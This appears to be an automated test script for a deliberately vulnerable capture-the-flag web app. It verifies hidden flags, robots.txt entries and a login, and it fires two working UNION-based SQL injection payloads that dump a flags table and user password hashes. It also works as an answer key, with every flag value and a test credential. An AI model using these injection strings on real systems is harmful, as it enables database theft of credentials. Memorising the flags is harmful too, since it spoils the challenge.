"""Comprehensive automated test for Aethelgard Archipelago CTF Application."""
import sys
from pathlib import Path
from starlette.testclient import TestClient

PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from app.main import app

client = TestClient(app)

def run_tests():
    print("=== STARTING AETHELGARD ARCHIVES CTF SUITE ===")
    
    # 1. Test Home Route & Flag 1 Header
    print("\n[1] Testing GET / & Reconnaissance Header (Flag 1)...")
    res = client.get("/")
    assert res.status_code == 200, f"Expected 200, got {res.status_code}"
    assert "AETHELGARD ARCHIVES" in res.text
    assert "X-Archipelago-Node" in res.headers, "Header X-Archipelago-Node missing!"
    flag1 = res.headers["X-Archipelago-Node"]
    print(f"    [+] Found Flag 1 Header: {flag1}")
    assert "flag{4rch1p3l4g0_r3c0n_f1ng3rpr1nt_88a1}" in flag1
    
    # 2. Test robots.txt
    print("\n[2] Testing GET /robots.txt...")
    res = client.get("/robots.txt")
    assert res.status_code == 200
    assert "Disallow: /mail/" in res.text
    assert "Disallow: /flights/" in res.text
    assert "Disallow: /photos/" in res.text
    print("    [+] robots.txt contains expected hidden compartments.")
    
    # 3. Test /mail & Flag 4 (Executive Correspondence)
    print("\n[3] Testing GET /mail & Flag 4...")
    res = client.get("/mail")
    assert res.status_code == 200
    assert "Leaked Correspondence" in res.text
    assert "flag{pr1v4t3_m41l_c00rd1n4t3s_3xfl1tr4t3d_44b1}" in res.text
    print("    [+] Leaked mails render cleanly with Flag 4 coordinates.")
    
    # 4. Test SQL Injection on /mail (Flag 2 Extraction)
    print("\n[4] Testing SQL Injection on /mail (Flag 2)...")
    sqli_payload = "' UNION SELECT 1, 'flag', flag_name, flag_value, 'FLAG', '2026', 'admin' FROM system_flags--"
    res = client.get(f"/mail?q={sqli_payload}")
    assert res.status_code == 200
    assert "FLAG_2_DATABASE" in res.text
    assert "flag{sql1_3xtr4ct_v4nc3_cr3d3nt14ls_77d2}" in res.text
    print("    [+] SQL Injection successfully dumped system_flags table (Flag 2 verified).")
    
    # 5. Test SQL Injection user dump
    print("\n[5] Testing SQL Injection user dump...")
    sqli_user_payload = "' UNION SELECT 1, 'user', username, password_hash, role, '2026', 'admin' FROM users--"
    res = client.get(f"/mail?q={sqli_user_payload}")
    assert res.status_code == 200
    assert "d.mercer" in res.text
    assert "$2b$12$" in res.text
    print("    [+] User bcrypt hash successfully extracted via SQLi.")

    # 6. Test /flights (Private Aviation Registry)
    print("\n[6] Testing GET /flights...")
    res = client.get("/flights")
    assert res.status_code == 200
    assert "N708AG" in res.text
    assert "Site Bravo Private Runway" in res.text
    print("    [+] Private aviation registry rendered.")

    # 7. Test /photos (Classified Media Vault & Flag 5)
    print("\n[7] Testing GET /photos (Flag 5)...")
    res = client.get("/photos")
    assert res.status_code == 200
    assert "SURVEILLANCE: Site Bravo Private Island Estate" in res.text
    assert "flag{cl4ss1f13d_fl1ght_m4n1f3st_v4ult_55f9}" in res.text
    print("    [+] Classified media vault and Flag 5 verified.")

    # 8. Test Authentication & Dashboard
    print("\n[8] Testing /login and /dashboard...")
    login_res = client.post("/login", data={"username": "d.mercer", "password": "telecom2019", "next": "/dashboard"})
    assert login_res.status_code in (200, 302, 303)
    dash_res = client.get("/dashboard")
    assert dash_res.status_code == 200
    assert "Executive Management Console" in dash_res.text
    assert "flag{r00t_m4st3r_4rch1p3l4g0_0wn3d_993c}" in dash_res.text
    print("    [+] Dashboard authenticated session and Flag 3 verified.")

    print("\n=======================================================")
    print(">>> ALL 8 CTF FUNCTIONAL & SECURITY TESTS PASSED! <<<")
    print("=======================================================")

if __name__ == "__main__":
    run_tests()
